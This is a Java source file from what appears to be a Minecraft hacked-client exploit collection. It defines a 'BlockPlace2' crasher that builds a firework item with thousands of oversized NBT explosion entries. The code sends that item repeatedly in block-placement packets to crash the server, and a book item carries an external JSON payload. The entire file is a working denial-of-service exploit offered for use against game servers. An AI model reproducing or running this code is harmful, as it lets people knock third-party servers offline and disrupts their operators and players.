package pl.oucik.phecdateam.rebuild.exploit.impl.nbt;

import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;
import org.apache.commons.lang3.RandomStringUtils;
import pl.oucik.phecdateam.rebuild.exception.ExploitException;
import pl.oucik.phecdateam.rebuild.exploit.Exploit;
import pl.oucik.phecdateam.rebuild.exploit.ExploitInfo;
import pl.oucik.phecdateam.rebuild.exploit.ExploitType;
import pl.oucik.phecdateam.rebuild.exploit.argument.Argument;
import pl.oucik.phecdateam.rebuild.helper.ChatHelper;
import pl.oucik.phecdateam.rebuild.holder.ExploitHolder;

import java.util.Arrays;


@ExploitInfo(
    name = "BlockPlace2",
    type = ExploitType.NBT
)
public class BlockPlace2 extends Exploit<PacketBuffer> {

    public BlockPlace2() {
        super(() -> {
                    ItemStack itemStack = new ItemStack(Items.written_book);
                    NBTTagCompound compound = new NBTTagCompound();

                    NBTTagList pages = new NBTTagList();
                    pages.appendTag(new NBTTagString(ExploitHolder.getExtraJson()));

                    compound.setString("author", RandomStringUtils.randomAlphabetic(10));
                    compound.setString("title", RandomStringUtils.randomAlphabetic(10));
                    compound.setByte("resolved", (byte) 1);
                    compound.setTag("pages", pages);

                    itemStack.setTagCompound(compound);

                    PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                    packetBuffer.writeItemStackToBuffer(itemStack);

                    return packetBuffer;
                },
                new Argument("packets", 0, Integer.class));
    }

    @Override
    public void execute(Object... args) throws ExploitException {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        (new Thread(() -> {
            try {
                final ItemStack firework = new ItemStack(Items.fireworks);
                final NBTTagCompound outerTag = new NBTTagCompound();
                final NBTTagCompound tag2 = new NBTTagCompound();
                final NBTTagList list2 = new NBTTagList();
                final int[] arr = new int[64];
                for (int k = 0; k < 3260; ++k) {
                    Arrays.fill(arr, k + 1);
                    final NBTTagCompound explosion = new NBTTagCompound();
                    explosion.setIntArray("Colors", arr);
                    list2.appendTag(explosion);
                }
                tag2.setTag("Explosions", list2);
                tag2.setByte("Flight", (byte) 2);
                outerTag.setTag("Fireworks", tag2);
                firework.setTagCompound(outerTag);
                for (int i2 = 0; i2 < packets; ++i2) {
                    Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 2.0, Minecraft.getMinecraft().thePlayer.posZ), 1, firework, 0.0f, 0.0f, 0.0f));
                    Thread.sleep(200L);
                }
            } catch (Exception ignored) {
            }
        })).start();
        ChatHelper.printMessage(String.format("&C&LCrashing server with method &4&lBlockPlace2"));
    }
}
